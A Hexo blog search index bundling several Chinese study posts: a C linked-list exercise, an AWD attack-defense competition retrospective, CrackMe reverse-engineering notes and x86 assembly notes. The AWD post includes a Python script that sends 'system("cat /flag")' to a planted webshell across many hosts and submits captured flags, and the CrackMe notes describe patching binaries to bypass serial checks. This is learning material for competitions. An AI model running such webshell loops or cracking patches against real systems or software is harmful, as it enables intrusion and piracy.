<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/12/06/12-4/"/>
    <url>/2021/12/06/12-4/</url>
    
    <content type="html"><![CDATA[<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><p>链表特性：存放数据的位置是随机的（所以由每次跳跃下一个数据都要有个指针来指向下一个节点）</p><p>其实总结到这我感觉很像现实中的蟹网，每一个结点不仅包含着下一个节点的位置还包含着数据</p><p>自己打了个链表：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link</span> &#123;</span><br><span class="hljs-keyword">int</span> elem;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link</span>* <span class="hljs-title">next</span>;</span><br>&#125;link;<br><br><span class="hljs-function">link* <span class="hljs-title">initLink</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">display</span><span class="hljs-params">(link* p)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;初始化链表为:\n&quot;</span>);<br>link* p = <span class="hljs-built_in">initLink</span>();<br><span class="hljs-built_in">display</span>(p);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">link* <span class="hljs-title">initLink</span><span class="hljs-params">()</span> </span>&#123;<br>link* p = <span class="hljs-literal">NULL</span>;<br>link* temp = (link*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(link));<br>temp-&gt;elem = <span class="hljs-number">1</span>;<br>temp-&gt;next = <span class="hljs-literal">NULL</span>;<br>p = temp;  <span class="hljs-comment">/*为什么要先初始化首元节点再被头指针指向呢*/</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>link* a = (link*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(link));<br>a-&gt;elem = i;  <span class="hljs-comment">/*这个for循环就是让当前节点赋值数据再包含下一个节点*/</span><br>a-&gt;next = <span class="hljs-literal">NULL</span>;<br>temp-&gt;next = a;<br>temp = temp-&gt;next;<br><br><br>&#125;<br><span class="hljs-keyword">return</span> p;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">display</span><span class="hljs-params">(link* p)</span> </span>&#123;<br>link* temp = p;    <span class="hljs-comment">/*判断节点是否为null*/</span><br><span class="hljs-keyword">while</span> (temp) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, temp-&gt;elem);<br>temp = temp-&gt;next;<br><br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>过程中的报错：<br>LNK2001    无法解析的外部符号 “void __cdecl display(struct Link *)” (?display@@YAXPAULink@@@Z)    </p><p>解决办法：后来发现最后一个函数display写成了display</p><p>引用文章：什么是未解析的外部符号？</p><p><u><em><u>符号</u></em>是函数或全局变量的内部名称。 它是已编译对象文件或库中使用或定义的名称形式。 全局变量在对象文件中定义，其中为它分配了存储。 函数在对象文件中定义，其中放置了函数主体的已编译代码。 外部 <em>符号</em> 在一个对象文件中引用，但在不同的库或对象文件中定义。 <em>导出的符号</em>是由定义它的对象文件或库公开提供的符号。</u></p><p><u>若要创建应用程序或 DLL，所使用的每个符号都必须具有定义。 链接器必须 <em>解析</em>，或查找每个对象文件引用的每个外部符号的匹配定义。 链接器在无法解析外部符号时生成错误。 这意味着链接器在任何链接文件中都找不到匹配的导出符号定义。</u></p><p>疑问：为什么当我这样未定义函数的时候，他出现的报错信息不是LINK2019呢？</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">display</span><span class="hljs-params">()</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;test:\n&quot;</span>); <br><span class="hljs-keyword">int</span>* p = <span class="hljs-literal">NULL</span>; <br><span class="hljs-built_in">display</span>(p); <span class="hljs-comment">//At this time it did not appear an error like LINK2019 </span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br></code></pre></td></tr></table></figure><p>查阅了资料了后发现：<br>因为我是作为cpp文件进行编译的，而C++支持函数重载，display先判定的是函数重载，随后才判定函数是否有被定义。</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/11/27/AWD/"/>
    <url>/2021/11/27/AWD/</url>
    
    <content type="html"><![CDATA[<h1 id="记一次AWD"><a href="#记一次AWD" class="headerlink" title="记一次AWD"></a>记一次AWD</h1><p>一些失败原因的总结和对下次awd的要做的事情</p><p>给个清晰的定位</p><p>一些常见命令：</p><p>tar -zcvf /var/www/html/html.tar.gz /var/www/html</p><p>一些代码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><span class="hljs-attribute">url</span>=<span class="hljs-string">&#x27;http://172.17.135.39:&#123;&#125;/.fwma.php&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(8001,8011):<br>   try:<br>    date=&#123;<span class="hljs-string">&#x27;fwfwfwfwfw&#x27;</span>:<span class="hljs-string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span>&#125;<br><br>    <span class="hljs-attribute">h</span>=url.format(i)<br>    <span class="hljs-builtin-name">print</span>(h)<br>    <span class="hljs-attribute">g</span>=requests.post(url=h,data=date)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> g.text:<br>        url = <span class="hljs-string">&quot;http://172.17.135.26:19999/api/flag&quot;</span><br>        headers = &#123;<span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;application/json, text/plain, */*&quot;</span>, <span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&quot;b67f4335dd35fc53718d46bef5be9361&quot;</span>, <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span>, <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://172.17.135.26:19999&quot;</span>, <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://172.17.135.26:19999/&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>&#125;<br>        json1=&#123;<span class="hljs-string">&quot;flag&quot;</span>: g.text&#125;<br><br>        <span class="hljs-attribute">h</span>=requests.post(url, <span class="hljs-attribute">headers</span>=headers, <span class="hljs-attribute">json</span>=json1)<br>        <span class="hljs-builtin-name">print</span>(h.text)<br>   except:<br>    <span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;寄了寄了&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="首先是靶机有多少台（应该扫描端口），哪几台是机器人，哪几台是参赛选手操控"><a href="#首先是靶机有多少台（应该扫描端口），哪几台是机器人，哪几台是参赛选手操控" class="headerlink" title="首先是靶机有多少台（应该扫描端口），哪几台是机器人，哪几台是参赛选手操控"></a>首先是靶机有多少台（应该扫描端口），哪几台是机器人，哪几台是参赛选手操控</h3><h3 id="其次，参赛选手ssh账户密码是否是统一还是随机，统一则需上线passwd，check是否有遵循规律"><a href="#其次，参赛选手ssh账户密码是否是统一还是随机，统一则需上线passwd，check是否有遵循规律" class="headerlink" title="其次，参赛选手ssh账户密码是否是统一还是随机，统一则需上线passwd，check是否有遵循规律"></a>其次，参赛选手ssh账户密码是否是统一还是随机，统一则需上线passwd，check是否有遵循规律</h3><h2 id="分工"><a href="#分工" class="headerlink" title="分工"></a>分工</h2><h3 id="败笔：总结了下这次分工多少有点仓促，分工不精确导致我们后期无所事事，一度要被追赶上来"><a href="#败笔：总结了下这次分工多少有点仓促，分工不精确导致我们后期无所事事，一度要被追赶上来" class="headerlink" title="败笔：总结了下这次分工多少有点仓促，分工不精确导致我们后期无所事事，一度要被追赶上来"></a>败笔：总结了下这次分工多少有点仓促，分工不精确导致我们后期无所事事，一度要被追赶上来</h3><h3 id="下次要分为两个职能，web手负责审计代码和制造payload和补修代码，我负责编写脚本，负责脚本运行和网站整体维修，还有双方时不时看下日志分析"><a href="#下次要分为两个职能，web手负责审计代码和制造payload和补修代码，我负责编写脚本，负责脚本运行和网站整体维修，还有双方时不时看下日志分析" class="headerlink" title="下次要分为两个职能，web手负责审计代码和制造payload和补修代码，我负责编写脚本，负责脚本运行和网站整体维修，还有双方时不时看下日志分析"></a>下次要分为两个职能，web手负责审计代码和制造payload和补修代码，我负责编写脚本，负责脚本运行和网站整体维修，还有双方时不时看下日志分析</h3><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h3><ul><li><p>精而简</p><ul><li>小脚本具有的灵活性往往能在比赛中起到大作用</li></ul></li></ul><h2 id="心态"><a href="#心态" class="headerlink" title="心态"></a>心态</h2><h3 id="败笔：略现浮躁，在小胜一筹后没有选择批量化攻击，策略上也有所失误"><a href="#败笔：略现浮躁，在小胜一筹后没有选择批量化攻击，策略上也有所失误" class="headerlink" title="败笔：略现浮躁，在小胜一筹后没有选择批量化攻击，策略上也有所失误"></a>败笔：略现浮躁，在小胜一筹后没有选择批量化攻击，策略上也有所失误</h3><p>来张图：</p><p><img src="/2021/11/27/AWD/1.png" alt="AWD"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/11/23/CrakeMe/"/>
    <url>/2021/11/23/CrakeMe/</url>
    
    <content type="html"><![CDATA[<h1 id="CrakeMe经典160题（11-21-11-23）"><a href="#CrakeMe经典160题（11-21-11-23）" class="headerlink" title="CrakeMe经典160题（11.21-11.23）"></a>CrakeMe经典160题（11.21-11.23）</h1><h1 id="Acid-burn-exe"><a href="#Acid-burn-exe" class="headerlink" title="Acid burn.exe"></a>Acid burn.exe</h1><p>收集信息：</p><p>一打开会有一个弹窗</p><p><img src="/2021/11/23/CrakeMe/1.png" alt="CrakeMe"></p><p>进入到程序主页面试试各个按钮</p><p>试了下serial/Name按钮 发现</p><p>正常注册码错误信息sorry , The serial is incorect !</p><p>如果不输入账号的话会报错</p><p><img src="/2021/11/23/CrakeMe/2.png" alt="CrakeMe"></p><p>Google一下发现  (<a href="https://stackoverflow.com/questions/15798281/troubleshooting-access-violation-at-address-read-of-address-00000000">https://stackoverflow.com/questions/15798281/troubleshooting-access-violation-at-address-read-of-address-00000000</a>)</p><p> 这样说明可能是根据账号“name”来进行算法运算来得到结果</p><p>Serial按钮单报错Try Again!!</p><p>调试过程：</p><p>查找可疑字符串</p><p>先在%d %s 还有错误信息这些地方段首下断</p><p>一开始想要模拟调用窗口的函数直接进行放回，后发现这样不行，在这函数里面已经扩展的新的（更大）的地址了</p><p>直接nop爆破后解除窗口</p><p>似乎全局调用弹窗窗口都是这个函数，nop后再按啥也没出</p><p>总结了下</p><p>这个错误应该是这样引起的</p><p>先是push字符串进栈，但是接下来我却没调用（因为我nop掉了），而且在这个函数里面他还根据我的字符串初始化了指针，所以所有窗口都寄了</p><p>因此我选择在段首直接retn，假装无事发生</p><p>先来试试name/serial按钮里面的，定位字符串位置，</p><p>发现上面有个JGE，防止数据溢出和输入的是负数</p><p>定位多个关键字符串段首断点，发现他是先归为失败的结果，再进行比较，于是在栈中变量变化的两个函数内，我反复断点，</p><p>发现第一个call主要任务是给cx赋予10，然后进入第二个call，对每个字符进行判断查看是否违法，第二个call里面的第二个跳转，终于不停调试找到了（泪目）</p><p><img src="/2021/11/23/CrakeMe/3.png" alt="CrakeMe"></p><p>将之前计算的eax的值取出来与10取余，进行运算，也就是按位取出，再进行进制转换</p><p>补充：前面eax那里有个movzx，取出来第一个字母码，所以实际上*的是57（大小端存储方式）</p><p>学会的东西：</p><p>1.一些来自x86的字符串汇编指令stosd，REPNE/REPNZ，MOVZX</p><p>2.一些算法逆向大概框架</p><p>3.还有nop的一些注意事项</p><p>芜湖部分：</p><p>了解算法后好玩的试探</p><p><img src="/2021/11/23/CrakeMe/4.png" alt="CrakeMe"></p><p><img src="/2021/11/23/CrakeMe/5.png" alt="CrakeMe"></p><h1 id="Andrnalin-1"><a href="#Andrnalin-1" class="headerlink" title="Andrnalin.1"></a>Andrnalin.1</h1><p>这题没啥好说的，和上题总体逻辑一样</p><p>无算法，注册码都在汇编里给出来了</p><p><img src="/2021/11/23/CrakeMe/6.png" alt="CrakeMe"></p><h1 id="Afkayas-1-Exe"><a href="#Afkayas-1-Exe" class="headerlink" title="Afkayas.1.Exe"></a>Afkayas.1.Exe</h1><p><img src="/2021/11/23/CrakeMe/7.png" alt="CrakeMe"></p><p><img src="/2021/11/23/CrakeMe/8.png" alt="CrakeMe"></p><p><img src="/2021/11/23/CrakeMe/9.png" alt="CrakeMe"></p><p>好像是要分析他算法 先在成功的je前断点进入这个call</p><p><img src="/2021/11/23/CrakeMe/10.png" alt="CrakeMe"></p><p>发现前面有个cmp的，说明肯定在这个函数前面是算法</p><p>试了下我多次输入1发现结果都是这个，说明他这个算法结果解出来不是动态的</p><p>于是试下账户1 和他计算完的结果</p><p><img src="/2021/11/23/CrakeMe/11.png" alt="CrakeMe"></p><h1 id="AfKayAs-2-Exe"><a href="#AfKayAs-2-Exe" class="headerlink" title="AfKayAs.2.Exe"></a>AfKayAs.2.Exe</h1><p><img src="/2021/11/23/CrakeMe/12.png" alt="CrakeMe"></p><p>比si（和上题一样，看下断点f7跟进看算完的ESI寄存器就行</p><p>解除nop窗口</p><p><img src="/2021/11/23/CrakeMe/13.png" alt="CrakeMe"></p><p>f8跟进发现调用窗口指令</p><p>直接jmp</p><p>发现寄了</p><p>f7跟进去</p><p>上面</p><p>发现没用，搜索文章看了下vb程序结构体</p><p>在数据段找到结构体段开头跟随</p><p>用4C大法，为什么是4C呢，因为从结构体开头地址进来</p><p>第一个块是调用dll之类的程序，块结尾到块开头减去刚好等于4C</p><p>注意事项：更改内存地址数据的时候要结合块来全部进行保存</p><p><img src="/2021/11/23/CrakeMe/14.png" alt="CrakeMe"></p><h1 id="ajj-1"><a href="#ajj-1" class="headerlink" title="ajj.1"></a>ajj.1</h1><p><img src="/2021/11/23/CrakeMe/15.png" alt="CrakeMe"></p><p>也是拼接字符串，这些还不如第一题难找，第一题属实是找半年了</p><p>这四题都是可以再栈中直接找到注册码的，算法也都类似</p><h1 id="总结CrakeMe过程"><a href="#总结CrakeMe过程" class="headerlink" title="总结CrakeMe过程"></a>总结CrakeMe过程</h1><p>1.查看原生信息：例如是什么文件格式，多少位的文件，用什么壳，什么软件……</p><p>2.进软件正常运行，没有注册码他会怎么样，是否有不同的报错，调用哪些api</p><p>调试过程</p><p>看着你输入的字符串，在汇编里面如何跳转加密（过程中下断点）</p><p>根据window api调用来下断点（节约时间）</p><p>unicode字符串语句段首断点</p><p>判断算法在跳转语句的哪一个部分</p><p>3.分析算法</p><p>这部分就得细看汇编语言</p><p>了解字符串在内存中的表现形式</p><p>做完后对自己的建议：</p><p>1.对多个功能共用的窗口一定得警惕（不要无脑nop，有时优雅retn也行）</p><p>2.寻找算法方法：1.找到大概区间-》2.注意汇编中常量的存在-》3.注意运算过程中栈的表现形式（比如里面的字节计算过8364转为16进制找不出来，浪费了许多时间）</p><p>3.总结下来其实还是crakeme经验不足，算法逆向还不能手到擒来</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/11/23/10.24-11.17/"/>
    <url>/2021/11/23/10.24-11.17/</url>
    
    <content type="html"><![CDATA[<h1 id="16位系统汇编-10-24-11-21"><a href="#16位系统汇编-10-24-11-21" class="headerlink" title="16位系统汇编(10.24-11.21)"></a>16位系统汇编(10.24-11.21)</h1><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><ul><li><p>ds</p><ul><li>用来存放访问数据的段地址</li></ul></li><li><p>ss</p><ul><li><p>与sp一起来存放栈的地址</p><ul><li><p>ss作为段地址 </p></li><li><p>sp作为偏移地址</p></li><li><p>注意事项</p><ul><li>由于栈空间是由高地址向低地址增长的，栈为空的时候字单元偏移地址得+2</li></ul></li></ul></li></ul></li><li><p>cs</p><ul><li><p>与ip一起来存放要进行指令地址的读取</p><ul><li>cs是整一个代码段的起始地址</li><li>ip是将要读取的代码的偏移地址 </li><li>通过改变cs和ip可以让程序段之间来回跳转</li></ul></li></ul></li><li><p>es</p><ul><li>附加段寄存器</li></ul></li></ul><h3 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h3><ul><li><p>标志寄存器</p><ul><li><p>CF</p></li><li><p>PF</p></li><li><p>ZP</p></li><li><p>SF</p></li><li><p>OF</p></li><li><p>DF</p></li><li><p>IF</p><ul><li>与中断指令有关</li></ul></li><li><p>TF</p><ul><li>内中断用于单步调试</li></ul></li><li><p>AF</p><ul><li>辅助进位</li></ul></li></ul></li><li><p>数据寄存器</p><ul><li><p>ax</p><ul><li>用于普通加减寄存器</li></ul></li><li><p>bx</p><ul><li><p>基地址寄存器</p><ul><li>快速访问内存地址</li></ul></li></ul></li><li><p>cx</p><ul><li>用于loop的，计数寄存器</li></ul></li><li><p>dx</p><ul><li>div那些命令高位与低位计算用于存放高16位</li></ul></li></ul></li><li><p>指针寄存器</p><ul><li><p>bp</p><ul><li>其实就是C语言函数调用那里的函数传参调用，这么说调用其实就是传递地址，地址包含着常量进去占据内存空间</li></ul></li><li><p>sp</p><ul><li>栈顶的偏移地址</li></ul></li><li><p>梦幻联动，bp是用来在里面寻找数据的地址，sp是来被bp来改的，所以所</p></li></ul></li><li><p>变址寄存器</p><ul><li>si</li><li>di</li></ul></li><li><p>ip</p><ul><li>ip是将要读取的代码的偏移地址 </li></ul></li><li><p>注意事项：只有数据寄存器才能分为两个8位寄存器来分别存放</p></li></ul><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><h3 id="loop指令"><a href="#loop指令" class="headerlink" title="loop指令"></a>loop指令</h3><h3 id="算数运算指令"><a href="#算数运算指令" class="headerlink" title="算数运算指令"></a>算数运算指令</h3><ul><li><p>ADD</p></li><li><p>ADC</p><ul><li>和cf一起冲！</li></ul></li><li><p>INC</p><ul><li>不和cf一起冲</li></ul></li><li><p>sub</p></li><li><p>sbb</p></li><li><p>cmp</p><ul><li><p>不保存结果的减法指令</p><ul><li>溢出为假命题</li><li>不溢出为真命题</li></ul></li></ul></li><li><p>mul</p></li><li><p>imul</p></li><li><p>div</p></li><li><p>idiv</p></li></ul><h3 id="程序转移指令"><a href="#程序转移指令" class="headerlink" title="程序转移指令"></a>程序转移指令</h3><ul><li><p>J家族</p><ul><li>je</li><li>jne</li><li>jb</li><li>jnb</li><li>ja</li><li>jna</li><li>jcxz</li></ul></li></ul><h2 id="段的概念"><a href="#段的概念" class="headerlink" title="段的概念"></a>段的概念</h2><h3 id="其实内存空间都是连续的，段其实就是为了方便人类理解汇编罢了"><a href="#其实内存空间都是连续的，段其实就是为了方便人类理解汇编罢了" class="headerlink" title="其实内存空间都是连续的，段其实就是为了方便人类理解汇编罢了"></a>其实内存空间都是连续的，段其实就是为了方便人类理解汇编罢了</h3><h2 id="奇怪的想法"><a href="#奇怪的想法" class="headerlink" title="奇怪的想法"></a>奇怪的想法</h2><h3 id="问题：既然都有数据寄存器那些，为什么还要数据段寄存器呢？"><a href="#问题：既然都有数据寄存器那些，为什么还要数据段寄存器呢？" class="headerlink" title="问题：既然都有数据寄存器那些，为什么还要数据段寄存器呢？"></a>问题：既然都有数据寄存器那些，为什么还要数据段寄存器呢？</h3><ul><li>自答：我觉得应该是DS是存放这原有程序给与的数据基地址，在进行完地址加法器得到物理地址后，运算过程中数据存放实在ax里面</li></ul><p>看完后补充：差不多，运算过程是在指令缓冲器的</p><h3 id="这里本来只有128个单位为什么说占256字节"><a href="#这里本来只有128个单位为什么说占256字节" class="headerlink" title="这里本来只有128个单位为什么说占256字节"></a>这里本来只有128个单位为什么说占256字节</h3><ul><li>自答：每个单元占两个字</li></ul><h1 id="冯-诺伊曼体系"><a href="#冯-诺伊曼体系" class="headerlink" title="冯|诺伊曼体系"></a>冯|诺伊曼体系</h1><h1 id="x86汇编学习"><a href="#x86汇编学习" class="headerlink" title="x86汇编学习"></a>x86汇编学习</h1><h1 id="寄存器与汇编"><a href="#寄存器与汇编" class="headerlink" title="寄存器与汇编"></a>寄存器与汇编</h1><p>标志寄存器是用来保存汇编指令运算过程中的结果</p><h1 id="内存寻址"><a href="#内存寻址" class="headerlink" title="内存寻址"></a>内存寻址</h1><p>编译器生成逻辑地址，再由分段机制将逻辑地址转换而来成为线性地址，再进行分页机制得出物理地址</p><p>思考问题:pe文件结构地址 RVA+ 基址=VA </p><p>这个基址是不是指的是物理地址，rva是不是指的是逻辑地址？<br>不对 这个内存寻址不是在CPU里面进行处理的吗？那这些偏移地址又会对这个pe结构有什么交互影响吗？</p><p>x86体系内存寻址模式</p><p>实模式分段模型</p><p>实模式地址总线20位，地址使用虚拟地址，段是以64kb来固定大小</p><p>保护模式地址总线32位</p><h1 id="RISC与CISC"><a href="#RISC与CISC" class="headerlink" title="RISC与CISC"></a>RISC与CISC</h1><p>  RISC</p><p>代表苹果系统 arm</p><p>存储结构更多要求再寄存器中计算不会访问内存</p><p>可以并线操作（意思应该是在多个寄存器中同时进行运算）</p><p>长度一般为4个字节 单周期单条指令</p><h1 id="传送指令"><a href="#传送指令" class="headerlink" title="传送指令"></a>传送指令</h1><p>MOV</p><p>段寄存器不能用mov直接传送</p><p>例：MOV EAX，DWORD PTR SS:[EBP-1C]</p><p>解析  dword是指存放数据的宽度 ss是指哪个段 （疑问到底是哪个段呢），【EBP-1C】是指对基地址的偏移（就是存放在哪里)</p><p>内存段看到代码90就是nop指令 空转 什么都不执行</p><p>疑问：参数入栈的时候是esp先向上加空间再存入还是先存入再加空间</p><p>LEA 和MOV的区别LEA 【】这里面可以放表达式而mov不行</p><h1 id="位运算指令"><a href="#位运算指令" class="headerlink" title="位运算指令"></a>位运算指令</h1><p>test 指令会更改eflags（zf）的标志位，and则不会</p><p>eax存着自定函数的返回值</p><p>shr对于逻辑右移来说统统用0来去填充</p><p>sar对于算数右移来说根据符号位来去填充</p><p>ROL 循环左移两位</p><p>就是 00110011变成110000</p><p>ROR循环右移一样</p><h1 id="未整合完待续……"><a href="#未整合完待续……" class="headerlink" title="未整合完待续…….."></a>未整合完待续……..</h1><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/10/25/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/"/>
    <url>/2021/10/25/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</url>
    
    <content type="html"><![CDATA[<h1 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h1><h2 id="二维数组初始化"><a href="#二维数组初始化" class="headerlink" title="二维数组初始化"></a>二维数组初始化</h2><h3 id="先行后列"><a href="#先行后列" class="headerlink" title="先行后列"></a>先行后列</h3><h2 id="二维数组的遍历"><a href="#二维数组的遍历" class="headerlink" title="二维数组的遍历"></a>二维数组的遍历</h2><h3 id="C语言中是以先行后列的方式来进行编译的，所以遍历最好一样，否则数据过大，导致效率变慢"><a href="#C语言中是以先行后列的方式来进行编译的，所以遍历最好一样，否则数据过大，导致效率变慢" class="headerlink" title="C语言中是以先行后列的方式来进行编译的，所以遍历最好一样，否则数据过大，导致效率变慢"></a>C语言中是以先行后列的方式来进行编译的，所以遍历最好一样，否则数据过大，导致效率变慢</h3><p>357913941</p><p>357913932</p><p>1000,0000,0000,0000,0000</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>10-24</title>
    <link href="/2021/10/25/10-24/"/>
    <url>/2021/10/25/10-24/</url>
    
